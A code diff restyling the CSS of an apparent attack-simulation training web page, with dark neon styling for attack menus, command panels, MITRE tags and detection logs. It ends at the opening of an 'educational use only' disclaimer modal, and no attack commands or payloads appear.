@@ -7,1634 +7,619 @@
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #050a0e;
-  --bg2: #080f14;
-  --bg3: #0c1620;
-  --panel: #0a1520;
-  --border: #0e2535;
-  --border2: #1a3a50;
-  --red: #ff2d2d;
-  --red2: #ff6b6b;
-  --orange: #ff6d00;
-  --amber: #ffab00;
-  --cyan: #00e5ff;
-  --cyan2: #00b8d4;
-  --green: #00e676;
-  --green2: #69f0ae;
-  --text: #cdd9e5;
-  --text2: #8ba3b8;
-  --text3: #4a6578;
-  --mono: 'Share Tech Mono', monospace;
-  --head: 'Orbitron', sans-serif;
-  --body: 'Rajdhani', sans-serif;
-}
-
-* { margin:0; padding:0; box-sizing:border-box; }
-
-body {
-  background: var(--bg);
-  color: var(--text);
-  font-family: var(--body);
-  font-size: 16px;
-  min-height: 100vh;
-  overflow-x: hidden;
-}
-
-/* Scanline overlay */
-body::before {
-  content:'';
-  position:fixed;
-  inset:0;
-  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,229,255,0.015) 2px, rgba(0,229,255,0.015) 4px);
-  pointer-events:none;
-  z-index:9999;
-}
-
-/* Grid background */
-body::after {
-  content:'';
-  position:fixed;
-  inset:0;
-  background-image: linear-gradient(rgba(0,229,255,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(0,229,255,0.04) 1px, transparent 1px);
-  background-size: 40px 40px;
-  pointer-events:none;
-  z-index:0;
-}
-
-/* ─── HEADER ─── */
-header {
-  position: relative;
-  z-index: 10;
-  border-bottom: 1px solid var(--border2);
-  background: linear-gradient(180deg, rgba(255,45,45,0.06) 0%, transparent 100%);
-  padding: 0 2rem;
-}
-
-.header-inner {
-  max-width: 1400px;
-  margin: 0 auto;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 1.2rem 0;
-}
-
-.logo {
-  display: flex;
-  align-items: center;
-  gap: 1rem;
-}
-
-.logo-icon {
-  width: 44px; height: 44px;
-  background: var(--red);
-  clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 20px;
-  box-shadow: 0 0 20px rgba(255,45,45,0.5);
-  animation: pulse-red 2s ease-in-out infinite;
-}
-
-@keyframes pulse-red {
-  0%,100% { box-shadow: 0 0 20px rgba(255,45,45,0.5); }
-  50% { box-shadow: 0 0 40px rgba(255,45,45,0.9); }
-}
-
-.logo-text h1 {
-  font-family: var(--head);
-  font-size: 1.5rem;
-  color: #fff;
-  letter-spacing: 0.1em;
-}
-
-.logo-text span {
-  font-family: var(--mono);
-  font-size: 0.7rem;
-  color: var(--red);
-  letter-spacing: 0.2em;
-  text-transform: uppercase;
-}
-
-.header-right {
-  display: flex;
-  align-items: center;
-  gap: 1.5rem;
-}
-
-.status-badge {
-  display: flex;
-  align-items: center;
-  gap: 0.5rem;
-  font-family: var(--mono);
-  font-size: 0.75rem;
-  color: var(--green);
-  background: rgba(0,230,118,0.08);
-  border: 1px solid rgba(0,230,118,0.2);
-  padding: 0.3rem 0.8rem;
-  border-radius: 2px;
-}
-
-.status-dot {
-  width: 6px; height: 6px;
-  background: var(--green);
-  border-radius: 50%;
-  animation: blink 1.2s step-end infinite;
-}
-
-@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
-
-.disclaimer-btn {
-  font-family: var(--mono);
-  font-size: 0.7rem;
-  color: var(--amber);
-  background: rgba(255,171,0,0.08);
-  border: 1px solid rgba(255,171,0,0.3);
-  padding: 0.3rem 0.8rem;
-  border-radius: 2px;
-  cursor: pointer;
-  transition: all 0.2s;
-}
-.disclaimer-btn:hover { background: rgba(255,171,0,0.15); }
-
-/* ─── DISCLAIMER MODAL ─── */
-.modal-overlay {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.85);
-  z-index: 1000;
-  align-items: center;
-  justify-content: center;
-}
-.modal-overlay.active { display: flex; }
-
-.modal {
-  background: var(--bg3);
-  border: 1px solid var(--amber);
-  max-width: 560px;
-  width: 90%;
-  padding: 2rem;
-  box-shadow: 0 0 60px rgba(255,171,0,0.2);
-}
-
-.modal h2 {
-  font-family: var(--head);
-  font-size: 1rem;
-  color: var(--amber);
-  margin-bottom: 1rem;
-  letter-spacing: 0.1em;
-}
-
-.modal p {
-  font-size: 0.95rem;
-  color: var(--text2);
-  line-height: 1.7;
-  margin-bottom: 0.8rem;
-}
-
-.modal-close {
-  margin-top: 1.5rem;
-  background: var(--amber);
-  color: #000;
-  border: none;
-  padding: 0.6rem 2rem;
-  font-family: var(--head);
-  font-size: 0.85rem;
-  cursor: pointer;
-  letter-spacing: 0.1em;
-}
-
-/* ─── MAIN LAYOUT ─── */
-.main {
-  position: relative;
-  z-index: 1;
-  max-width: 1400px;
-  margin: 0 auto;
-  padding: 2rem;
-  display: grid;
-  grid-template-columns: 280px 1fr 320px;
-  gap: 1.5rem;
-  min-height: calc(100vh - 80px);
-}
-
-/* ─── PANELS ─── */
-.panel {
-  background: var(--panel);
-  border: 1px solid var(--border);
-  position: relative;
-  overflow: hidden;
-}
-
-.panel::before {
-  content:'';
-  position: absolute;
-  top: 0; left: 0; right: 0;
-  height: 2px;
-  background: linear-gradient(90deg, transparent, var(--cyan), transparent);
-  opacity: 0.4;
-}
-
-.panel-header {
-  padding: 0.8rem 1rem;
-  border-bottom: 1px solid var(--border);
-  display: flex;
-  align-items: center;
-  gap: 0.6rem;
-  background: rgba(0,229,255,0.03);
-}
-
-.panel-header h3 {
-  font-family: var(--mono);
-  font-size: 0.7rem;
-  color: var(--cyan);
-  letter-spacing: 0.15em;
-  text-transform: uppercase;
-}
-
-.panel-dot { width:6px; height:6px; border-radius:50%; background:var(--cyan); opacity:0.6; }
-
-/* ─── LEFT PANEL: ATTACK MENU ─── */
-.attack-list { padding: 0.5rem; }
-
-.attack-item {
-  padding: 0.8rem 0.8rem;
-  cursor: pointer;
-  border: 1px solid transparent;
-  margin-bottom: 0.3rem;
-  transition: all 0.2s;
-  position: relative;
-}
-
-.attack-item:hover {
-  border-color: var(--border2);
-  background: rgba(0,229,255,0.03);
-}
-
-.attack-item.active {
-  border-color: var(--red);
-  background: rgba(255,45,45,0.06);
-}
-
-.attack-item.active::before {
-  content:'';
-  position:absolute;
-  left:0; top:0; bottom:0;
-  width:3px;
-  background: var(--red);
-  box-shadow: 0 0 8px var(--red);
-}
-
-.attack-name {
-  font-family: var(--body);
-  font-weight: 700;
-  font-size: 0.95rem;
-  color: var(--text);
-  margin-bottom: 0.2rem;
-}
-
-.attack-item.active .attack-name { color: var(--red2); }
-
-.attack-meta {
-  display: flex;
-  gap: 0.5rem;
-  margin-top: 0.4rem;
-}
-
-.tag {
-  font-family: var(--mono);
-  font-size: 0.6rem;
-  padding: 0.15rem 0.4rem;
-  border-radius: 2px;
-  letter-spacing: 0.05em;
-}
-
-.tag-layer { background: rgba(0,229,255,0.1); color: var(--cyan); border: 1px solid rgba(0,229,255,0.2); }
-.tag-impact { background: rgba(255,45,45,0.1); color: var(--red2); border: 1px solid rgba(255,45,45,0.2); }
-.tag-stealth { background: rgba(0,230,118,0.1); color: var(--green); border: 1px solid rgba(0,230,118,0.2); }
-.tag-amber { background: rgba(255,171,0,0.1); color: var(--amber); border: 1px solid rgba(255,171,0,0.2); }
-
-/* ─── CENTER PANEL ─── */
-.center-panel { display: flex; flex-direction: column; gap: 1.5rem; }
-
-/* Network Canvas */
-.canvas-panel { flex-shrink: 0; }
-
-.net-canvas {
-  position: relative;
-  background: var(--bg2);
-  height: 260px;
-  overflow: hidden;
-}
-
-canvas#netCanvas {
-  width: 100%;
-  height: 100%;
-  display: block;
-}
-
-.canvas-overlay {
-  position: absolute;
-  top: 1rem; left: 1rem;
-  font-family: var(--mono);
-  font-size: 0.65rem;
-  color: var(--text3);
-  pointer-events: none;
-}
-
-/* Lab Controls */
-.lab-controls {
-  padding: 1rem;
-  border-top: 1px solid var(--border);
-  display: flex;
-  align-items: center;
-  gap: 1rem;
-  background: rgba(255,45,45,0.03);
-}
-
-.btn {
-  font-family: var(--head);
-  font-size: 0.75rem;
-  letter-spacing: 0.1em;
-  padding: 0.5rem 1.2rem;
-  border: 1px solid;
-  cursor: pointer;
-  transition: all 0.2s;
-  text-transform: uppercase;
-}
-
-.btn-primary {
-  background: var(--red);
-  border-color: var(--red);
-  color: #fff;
-  box-shadow: 0 0 15px rgba(255,45,45,0.3);
-}
-.btn-primary:hover { box-shadow: 0 0 25px rgba(255,45,45,0.6); }
-.btn-primary:disabled { opacity:0.4; cursor:not-allowed; }
-
-.btn-secondary {
-  background: transparent;
-  border-color: var(--border2);
-  color: var(--text2);
-}
-.btn-secondary:hover { border-color: var(--cyan); color: var(--cyan); }
-
-.attack-progress {
-  flex: 1;
-  height: 4px;
-  background: var(--border);
-  border-radius: 2px;
-  overflow: hidden;
-}
-
-.progress-fill {
-  height: 100%;
-  background: linear-gradient(90deg, var(--red), var(--orange));
-  width: 0%;
-  transition: width 0.3s;
-  box-shadow: 0 0 8px var(--red);
-}
-
-/* Steps Panel */
-.steps-panel {}
-
-.steps-container { padding: 1rem; }
-
-.phase-block {
-  margin-bottom: 1.2rem;
-  opacity: 0.3;
-  transition: opacity 0.5s;
-}
-
-.phase-block.active { opacity: 1; }
-.phase-block.done { opacity: 0.7; }
-
-.phase-label {
-  font-family: var(--mono);
-  font-size: 0.65rem;
-  color: var(--cyan);
-  letter-spacing: 0.15em;
-  margin-bottom: 0.5rem;
-  display: flex;
-  align-items: center;
-  gap: 0.5rem;
-}
-
-.phase-label::after {
-  content:'';
-  flex:1;
-  height:1px;
-  background: var(--border);
-}
-
-.step-item {
-  display: flex;
-  gap: 0.8rem;
-  padding: 0.5rem 0;
-  border-bottom: 1px solid rgba(255,255,255,0.04);
-  align-items: flex-start;
-}
-
-.step-num {
-  font-family: var(--mono);
-  font-size: 0.65rem;
-  color: var(--text3);
-  width: 20px;
-  flex-shrink: 0;
-  padding-top: 0.15rem;
-}
-
-.step-content {}
-
-.step-title {
-  font-weight: 700;
-  font-size: 0.9rem;
-  color: var(--text);
-  margin-bottom: 0.1rem;
-}
-
-.step-desc {
-  font-size: 0.8rem;
-  color: var(--text2);
-  line-height: 1.5;
-}
-
-.step-cmd {
-  margin-top: 0.4rem;
-  font-family: var(--mono);
-  font-size: 0.7rem;
-  color: var(--green);
-  background: rgba(0,230,118,0.06);
-  border: 1px solid rgba(0,230,118,0.15);
-  padding: 0.4rem 0.6rem;
-  border-radius: 2px;
-}
-
-/* ─── RIGHT PANEL ─── */
-.right-panel { display: flex; flex-direction: column; gap: 1.5rem; }
-
-/* Score cards */
-.score-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 0.8rem;
-  padding: 1rem;
-}
-
-.score-card {
-  background: var(--bg2);
-  border: 1px solid var(--border);
-  padding: 0.8rem;
-  text-align: center;
-}
-
-.score-label {
-  font-family: var(--mono);
-  font-size: 0.6rem;
-  color: var(--text3);
-  letter-spacing: 0.1em;
-  text-transform: uppercase;
-  margin-bottom: 0.4rem;
-}
-
-.score-val {
-  font-family: var(--head);
-  font-size: 1.5rem;
-  font-weight: 900;
-}
-
-.score-val.red { color: var(--red); text-shadow: 0 0 15px rgba(255,45,45,0.5); }
-.score-val.green { color: var(--green); text-shadow: 0 0 15px rgba(0,230,118,0.5); }
-.score-val.amber { color: var(--amber); text-shadow: 0 0 15px rgba(255,171,0,0.5); }
-.score-val.cyan { color: var(--cyan); text-shadow: 0 0 15px rgba(0,229,255,0.5); }
-
-/* Tool arsenal */
-.tool-list { padding: 0.5rem 1rem 1rem; }
-
-.tool-item {
-  display: flex;
-  align-items: center;
-  gap: 0.8rem;
-  padding: 0.6rem 0;
-  border-bottom: 1px solid rgba(255,255,255,0.04);
-}
-
-.tool-icon {
-  font-size: 1rem;
-  width: 28px;
-  text-align: center;
-}
-
-.tool-info {}
-.tool-name { font-weight: 700; font-size: 0.9rem; }
-.tool-use { font-family: var(--mono); font-size: 0.65rem; color: var(--text3); }
-
-/* Detection log */
-.det-log { padding: 0.5rem 1rem 1rem; }
-
-.log-entry {
-  font-family: var(--mono);
-  font-size: 0.68rem;
-  padding: 0.4rem 0.6rem;
-  margin-bottom: 0.3rem;
-  border-left: 2px solid;
-  background: rgba(255,255,255,0.02);
-  animation: fadeIn 0.5s ease;
-}
-
-@keyframes fadeIn { from{opacity:0; transform:translateX(-10px)} to{opacity:1; transform:translateX(0)} }
-
-.log-entry.warn { border-color: var(--amber); color: var(--amber); }
-.log-entry.alert { border-color: var(--red); color: var(--red2); }
-.log-entry.info { border-color: var(--cyan); color: var(--text2); }
-.log-entry.stealth { border-color: var(--green); color: var(--green); }
-
-/* MITRE box */
-.mitre-box { padding: 1rem; }
-
-.mitre-tag {
-  display: inline-block;
-  font-family: var(--mono);
-  font-size: 0.65rem;
-  padding: 0.25rem 0.6rem;
-  background: rgba(0,229,255,0.08);
-  border: 1px solid rgba(0,229,255,0.2);
-  color: var(--cyan);
-  margin: 0.2rem;
-  cursor: default;
-  transition: all 0.2s;
-}
-.mitre-tag:hover { background: rgba(0,229,255,0.15); }
-
-.mitre-tactic {
-  font-family: var(--mono);
-  font-size: 0.6rem;
-  color: var(--text3);
-  letter-spacing: 0.1em;
-  margin-bottom: 0.5rem;
-  margin-top: 0.8rem;
-}
-
-/* ─── BOTTOM BAR ─── */
-.bottom-bar {
-  position: relative;
-  z-index: 1;
-  border-top: 1px solid var(--border);
-  background: var(--bg2);
-  padding: 0.6rem 2rem;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-}
-
-.bottom-bar span {
-  font-family: var(--mono);
-  font-size: 0.65rem;
-  color: var(--text3);
-}
-
-.bottom-bar .legal {
-  color: var(--amber);
-  font-size: 0.6rem;
-}
-
-/* ─── WELCOME SCREEN ─── */
-.welcome-screen {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  height: 100%;
-  padding: 2rem;
-  text-align: center;
-}
-
-.welcome-screen h2 {
-  font-family: var(--head);
-  font-size: 1rem;
-  color: var(--text3);
-  letter-spacing: 0.2em;
-  margin-bottom: 0.5rem;
-}
-
-.welcome-screen p {
-  font-size: 0.85rem;
-  color: var(--text3);
-  max-width: 300px;
-  line-height: 1.6;
-}
-
-.welcome-arrow {
-  font-size: 2rem;
-  color: var(--border2);
-  margin-bottom: 1rem;
-  animation: arrow-pulse 2s ease-in-out infinite;
-}
-
-@keyframes arrow-pulse {
-  0%,100%{opacity:0.3; transform:translateX(0)} 
-  50%{opacity:0.7; transform:translateX(-8px)}
-}
-
-/* Scrollbar */
-::-webkit-scrollbar { width: 4px; }
-::-webkit-scrollbar-track { background: var(--bg); }
-::-webkit-scrollbar-thumb { background: var(--border2); }
-
-/* Responsive */
-@media(max-width:1100px) {
-  .main { grid-template-columns: 240px 1fr; }
-  .right-panel { display:none; }
-}
-@media(max-width:700px) {
-  .main { grid-template-columns: 1fr; }
-  .left-panel { display:none; }
-}
+  --bg:#000000; --bg2:#030303; --bg3:#080808;
+  --panel:#050505; --border:#111; --border2:#1a1a1a;
+  --neon-red:#ff0033; --neon-pink:#ff006e; --neon-orange:#ff6600;
+  --neon-amber:#ffcc00; --neon-green:#00ff41; --neon-cyan:#00ffff;
+  --neon-blue:#0066ff; --neon-purple:#cc00ff;
+  --text:#e0e0e0; --text2:#666; --text3:#2a2a2a;
+  --mono:'Share Tech Mono',monospace; --head:'Orbitron',sans-serif; --body:'Rajdhani',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{background:#000;color:var(--text);font-family:var(--body);min-height:100vh;overflow-x:hidden;}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,0.012) 3px,rgba(0,255,65,0.012) 4px);pointer-events:none;z-index:9997;}
+header{position:relative;z-index:100;background:#000;border-bottom:1px solid #111;padding:0 1.5rem;}
+header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 0%,var(--neon-red) 20%,var(--neon-orange) 50%,var(--neon-red) 80%,transparent 100%);animation:hline 4s ease-in-out infinite;}
+@keyframes hline{0%,100%{opacity:0.4}50%{opacity:1}}
+.header-inner{max-width:1500px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:0.9rem 0;}
+.logo{display:flex;align-items:center;gap:1rem;}
+.logo-skull{width:38px;height:38px;display:flex;align-items:center;justify-content:center;font-size:20px;position:relative;}
+.logo-skull::before{content:'';position:absolute;inset:-4px;border:1px solid var(--neon-red);clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);animation:sglow 2s ease-in-out infinite;}
+@keyframes sglow{0%,100%{filter:drop-shadow(0 0 4px var(--neon-red))}50%{filter:drop-shadow(0 0 14px var(--neon-red))}}
+.logo-text h1{font-family:var(--head);font-size:1.5rem;color:#fff;letter-spacing:0.15em;text-shadow:0 0 20px var(--neon-red),0 0 40px rgba(255,0,51,0.3);}
+.logo-text p{font-family:var(--mono);font-size:0.62rem;color:var(--neon-red);letter-spacing:0.22em;opacity:0.7;}
+.header-right{display:flex;align-items:center;gap:0.8rem;}
+.hbadge{font-family:var(--mono);font-size:0.65rem;padding:0.22rem 0.65rem;border:1px solid;letter-spacing:0.1em;cursor:pointer;transition:all 0.2s;}
+.hbg{border-color:var(--neon-green);color:var(--neon-green);}
+.hba{border-color:var(--neon-amber);color:var(--neon-amber);}
+.hba:hover{background:rgba(255,204,0,0.08);}
+.sdot{display:inline-block;width:5px;height:5px;background:var(--neon-green);border-radius:50%;margin-right:0.35rem;box-shadow:0 0 6px var(--neon-green);animation:blink 1.2s step-end infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.93);z-index:2000;align-items:center;justify-content:center;backdrop-filter:blur(4px);}
+.modal-overlay.active{display:flex;}
+.modal{background:#000;border:1px solid var(--neon-amber);max-width:520px;width:90%;padding:2rem;box-shadow:0 0 50px rgba(255,204,0,0.12);position:relative;}
+.modal::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--neon-amber),transparent);}
+.modal h2{font-family:var(--head);font-size:0.85rem;color:var(--neon-amber);letter-spacing:0.15em;margin-bottom:1rem;}
+.modal p{font-size:0.88rem;color:#666;line-height:1.8;margin-bottom:0.7rem;}
+.modal p strong{color:#bbb;}
+.modal p.warn{color:var(--neon-amber);}
+.modal-close{margin-top:1.2rem;font-family:var(--head);font-size:0.72rem;letter-spacing:0.15em;padding:0.55rem 1.8rem;background:var(--neon-amber);color:#000;border:none;cursor:pointer;transition:all 0.2s;}
+.modal-close:hover{box-shadow:0 0 20px var(--neon-amber);}
+.main{position:relative;z-index:1;max-width:1500px;margin:0 auto;padding:1.1rem;display:grid;grid-template-columns:255px 1fr 295px;gap:1.1rem;min-height:calc(100vh - 68px);}
+.panel{background:var(--panel);border:1px solid var(--border2);position:relative;overflow:hidden;}
+.panel-header{padding:0.6rem 0.9rem;border-bottom:1px solid var(--border2);display:flex;align-items:center;gap:0.5rem;background:rgba(255,255,255,0.015);}
+.panel-header h3{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.2em;text-transform:uppercase;}
+.ph-red h3{color:var(--neon-red);} .ph-green h3{color:var(--neon-green);} .ph-cyan h3{color:var(--neon-cyan);}
+.ph-amber h3{color:var(--neon-amber);} .ph-purple h3{color:var(--neon-purple);} .ph-orange h3{color:var(--neon-orange);}
+.pdot{width:5px;height:5px;border-radius:50%;flex-shrink:0;}
+.pd-r{background:var(--neon-red);box-shadow:0 0 6px var(--neon-red);}
+.pd-g{background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);}
+.pd-c{background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);}
+.pd-a{background:var(--neon-amber);box-shadow:0 0 6px var(--neon-amber);}
+.pd-o{background:var(--neon-orange);box-shadow:0 0 6px var(--neon-orange);}
+.attack-list{padding:0.4rem;}
+.attack-item{padding:0.7rem 0.75rem;cursor:pointer;border:1px solid transparent;margin-bottom:0.2rem;transition:all 0.15s;position:relative;}
+.attack-item:hover{border-color:#1a1a1a;background:rgba(255,255,255,0.025);}
+.attack-item.active{border-color:var(--neon-red);background:rgba(255,0,51,0.05);}
+.attack-item.active::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--neon-red);box-shadow:0 0 8px var(--neon-red);}
+.atk-name{font-family:var(--body);font-weight:700;font-size:0.92rem;color:#bbb;margin-bottom:0.1rem;transition:color 0.15s;}
+.attack-item.active .atk-name{color:var(--neon-red);text-shadow:0 0 8px rgba(255,0,51,0.4);}
+.attack-item:hover .atk-name{color:#fff;}
+.atk-sub{font-size:0.68rem;color:var(--text3);font-family:var(--mono);margin-bottom:0.35rem;}
+.attack-item.active .atk-sub{color:rgba(255,0,51,0.4);}
+.tags{display:flex;gap:0.25rem;flex-wrap:wrap;}
+.tag{font-family:var(--mono);font-size:0.56rem;padding:0.1rem 0.35rem;border:1px solid;letter-spacing:0.05em;}
+.tl{border-color:rgba(0,255,255,0.25);color:var(--neon-cyan);}
+.ti{border-color:rgba(255,0,51,0.25);color:var(--neon-red);}
+.ts{border-color:rgba(0,255,65,0.25);color:var(--neon-green);}
+.center{display:flex;flex-direction:column;gap:1.1rem;}
+.canvas-wrap{background:#000;height:230px;position:relative;overflow:hidden;}
+.canvas-wrap::before,.canvas-wrap::after{content:'';position:absolute;width:16px;height:16px;border-color:var(--neon-red);border-style:solid;z-index:10;opacity:0.5;}
+.canvas-wrap::before{top:6px;left:6px;border-width:1px 0 0 1px;}
+.canvas-wrap::after{bottom:6px;right:6px;border-width:0 1px 1px 0;}
+canvas#nc{width:100%;height:100%;display:block;}
+.cv-label{position:absolute;bottom:7px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:0.58rem;color:#222;letter-spacing:0.15em;white-space:nowrap;z-index:10;}
+.lab-ctrl{padding:0.7rem 0.9rem;border-top:1px solid var(--border2);display:flex;align-items:center;gap:0.7rem;background:rgba(255,0,51,0.02);}
+.btn-launch{font-family:var(--head);font-size:0.68rem;letter-spacing:0.12em;padding:0.45rem 1.1rem;background:var(--neon-red);color:#000;border:none;cursor:pointer;text-transform:uppercase;transition:all 0.2s;position:relative;overflow:hidden;white-space:nowrap;flex-shrink:0;}
+.btn-launch::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);transform:translateX(-100%);transition:transform 0.4s;}
+.btn-launch:hover::before{transform:translateX(100%);}
+.btn-launch:hover{box-shadow:0 0 20px var(--neon-red),0 0 40px rgba(255,0,51,0.3);}
+.btn-launch:disabled{opacity:0.2;cursor:not-allowed;box-shadow:none;}
+.btn-reset{font-family:var(--mono);font-size:0.62rem;padding:0.42rem 0.75rem;background:transparent;color:#333;border:1px solid #1a1a1a;cursor:pointer;transition:all 0.2s;white-space:nowrap;flex-shrink:0;}
+.btn-reset:hover{border-color:#333;color:#666;}
+.prog-bar{flex:1;height:2px;background:#111;overflow:hidden;}
+.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--neon-red),var(--neon-orange),var(--neon-amber));transition:width 0.2s;box-shadow:0 0 6px var(--neon-red);}
+.prog-pct{font-family:var(--mono);font-size:0.6rem;color:#333;white-space:nowrap;flex-shrink:0;}
+.pkt-display{padding:0.75rem 0.9rem;font-family:var(--mono);font-size:0.65rem;line-height:2;min-height:80px;background:#000;}
+.pkt-layer{color:var(--neon-orange);font-weight:bold;}
+.pkt-field{color:#333;}
+.pkt-val{color:var(--neon-green);}
+.pkt-empty{color:#1a1a1a;font-size:0.63rem;padding:1rem;text-align:center;}
+.chain-body{padding:0.9rem;overflow-y:auto;}
+.phase{margin-bottom:0.9rem;opacity:0.15;transition:opacity 0.5s,transform 0.4s;transform:translateX(-4px);}
+.phase.active{opacity:1;transform:translateX(0);}
+.phase.done{opacity:0.4;transform:translateX(0);}
+.phase-label{font-family:var(--mono);font-size:0.58rem;color:var(--neon-orange);letter-spacing:0.18em;margin-bottom:0.5rem;display:flex;align-items:center;gap:0.5rem;}
+.phase-label::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--neon-orange),transparent);opacity:0.25;}
+.step{display:flex;gap:0.7rem;padding:0.45rem 0;border-bottom:1px solid rgba(255,255,255,0.03);align-items:flex-start;transition:background 0.15s;}
+.step:hover{background:rgba(255,255,255,0.02);}
+.step-n{font-family:var(--mono);font-size:0.58rem;color:#222;width:16px;flex-shrink:0;padding-top:2px;}
+.step-t{font-weight:700;font-size:0.86rem;color:#ccc;margin-bottom:0.12rem;}
+.step-d{font-size:0.76rem;color:#444;line-height:1.5;}
+.step-cmd{margin-top:0.35rem;font-family:var(--mono);font-size:0.62rem;color:var(--neon-green);background:rgba(0,255,65,0.04);border-left:2px solid rgba(0,255,65,0.4);padding:0.35rem 0.55rem;white-space:pre-wrap;cursor:pointer;position:relative;transition:background 0.15s;}
+.step-cmd:hover{background:rgba(0,255,65,0.08);}
+.step-cmd::after{content:'COPY';position:absolute;top:0.25rem;right:0.45rem;font-size:0.52rem;color:#222;letter-spacing:0.1em;}
+.step-cmd.copied{border-color:var(--neon-cyan);color:var(--neon-cyan);}
+.step-cmd.copied::after{content:'✓ COPIED';color:var(--neon-cyan);}
+.right{display:flex;flex-direction:column;gap:1.1rem;}
+.score-grid{display:grid;grid-template-columns:1fr 1fr;gap:0.5rem;padding:0.7rem;}
+.sc{background:#000;border:1px solid #111;padding:0.65rem;text-align:center;transition:border-color 0.3s;cursor:default;}
+.sc:hover{border-color:#1a1a1a;}
+.sc-l{font-family:var(--mono);font-size:0.52rem;letter-spacing:0.12em;text-transform:uppercase;color:#222;margin-bottom:0.25rem;}
+.sc-v{font-family:var(--head);font-size:1.25rem;font-weight:900;transition:all 0.3s;}
+.sc-v.red{color:var(--neon-red);text-shadow:0 0 12px var(--neon-red);}
+.sc-v.green{color:var(--neon-green);text-shadow:0 0 12px var(--neon-green);}
+.sc-v.amber{color:var(--neon-amber);text-shadow:0 0 12px var(--neon-amber);}
+.sc-v.cyan{color:var(--neon-cyan);text-shadow:0 0 12px var(--neon-cyan);}
+.mitre-body{padding:0.7rem;}
+.mitre-tac{font-family:var(--mono);font-size:0.56rem;color:#222;letter-spacing:0.15em;margin:0.6rem 0 0.35rem;text-transform:uppercase;}
+.mitre-tac:first-child{margin-top:0;}
+.mitre-tag{display:inline-block;font-family:var(--mono);font-size:0.58rem;padding:0.18rem 0.45rem;margin:0.12rem;border:1px solid rgba(0,255,255,0.15);color:rgba(0,255,255,0.6);background:rgba(0,255,255,0.02);cursor:pointer;transition:all 0.15s;}
+.mitre-tag:hover{background:rgba(0,255,255,0.08);border-color:var(--neon-cyan);color:var(--neon-cyan);box-shadow:0 0 8px rgba(0,255,255,0.2);}
+.tool-body{padding:0.4rem 0.7rem 0.7rem;}
+.tool{display:flex;align-items:center;gap:0.6rem;padding:0.45rem 0;border-bottom:1px solid rgba(255,255,255,0.03);cursor:pointer;transition:background 0.15s;}
+.tool:hover{background:rgba(255,255,255,0.02);}
+.tool-ico{font-size:0.95rem;width:22px;text-align:center;flex-shrink:0;}
+.tool-n{font-weight:700;font-size:0.82rem;color:#999;}
+.tool-u{font-family:var(--mono);font-size:0.58rem;color:#2a2a2a;}
+.log-body{padding:0.4rem 0.7rem 0.7rem;max-height:190px;overflow-y:auto;}
+.log-e{font-family:var(--mono);font-size:0.6rem;padding:0.3rem 0.45rem;margin-bottom:0.2rem;border-left:2px solid;animation:fadeIn 0.4s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateX(-5px)}to{opacity:1;transform:translateX(0)}}
+.log-e.warn{border-color:var(--neon-amber);color:rgba(255,204,0,0.65);background:rgba(255,204,0,0.02);}
+.log-e.alert{border-color:var(--neon-red);color:rgba(255,0,51,0.75);background:rgba(255,0,51,0.02);}
+.log-e.info{border-color:#1a1a1a;color:#2a2a2a;background:transparent;}
+.log-e.stealth{border-color:var(--neon-green);color:rgba(0,255,65,0.65);background:rgba(0,255,65,0.02);}
+footer{position:relative;z-index:1;background:#000;border-top:1px solid #111;padding:0.45rem 1.5rem;display:flex;align-items:center;justify-content:space-between;}
+footer span{font-family:var(--mono);font-size:0.58rem;color:#1a1a1a;}
+footer .fl{color:rgba(255,204,0,0.3);}
+.welcome{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;text-align:center;gap:0.7rem;min-height:150px;}
+.w-arrow{font-family:var(--mono);font-size:1.2rem;color:#111;animation:arr 2s ease-in-out infinite;}
+@keyframes arr{0%,100%{opacity:0.3;transform:translateX(0)}50%{opacity:0.7;transform:translateX(-5px)}}
+.welcome h2{font-family:var(--head);font-size:0.78rem;color:#1a1a1a;letter-spacing:0.25em;}
+.welcome p{font-size:0.76rem;color:#111;max-width:240px;line-height:1.6;}
+::-webkit-scrollbar{width:2px;}
+::-webkit-scrollbar-track{background:#000;}
+::-webkit-scrollbar-thumb{background:#111;}
+@media(max-width:1100px){.main{grid-template-columns:230px 1fr;}.right{display:none;}}
+@media(max-width:680px){.main{grid-template-columns:1fr;padding:0.7rem;}}
 </style>
 </head>
 <body>
 
-<!-- DISCLAIMER MODAL -->
-<div class="modal-overlay active" id="disclaimerModal">
+<div class="modal-overlay active" id="modal">
   <div class="modal">
     <h2>⚠ EDUCATIONAL USE ONLY</h2>
